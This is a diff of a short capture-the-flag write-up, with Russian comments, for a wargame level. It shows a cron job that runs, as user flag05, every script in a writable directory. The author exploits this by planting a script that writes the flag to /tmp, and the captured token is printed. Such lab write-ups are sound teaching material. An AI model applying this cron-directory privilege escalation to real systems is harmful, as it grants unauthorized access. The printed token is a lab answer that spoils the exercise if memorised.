@@ -1,28 +1,31 @@
 level05
 
+вывод при первом входе
 You have new mail.
 
+решили проверить почту
 $ ls /var/mail
 level05
-здесь мы видим что каждые 2 минуты выполняется crontab
+
 $ cat /var/mail/level05
 */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
-
+здесь мы видим что каждые 2 минуты выполняется crontab со скриптом от имени пользователя flag05
 
 $ cat /usr/sbin/openarenaserver
 #!/bin/sh
-отсюда нам стало понятно, что выполняются все скрипты из папки
+
 for i in /opt/openarenaserver/* ; do
     (ulimit -t 5; bash -x "$i")
     rm -f "$i"
 done
+отсюда нам стало понятно, что выполняются все скрипты из папки
 
-Создаем скрипт и добавляем его в папку, а результат кладем в tmp
 $ cat > /opt/openarenaserver/printflag <<EOF
 getflag > /tmp/flag
 EOF
 
+Создаем скрипт и добавляем его в папку, а результат кладем в tmp и через 2 мин флаг будет в папке
+
 cat /tmp/flag
 
 Check flag.Here is your token : viuaaale9huek52boumoomioc
-
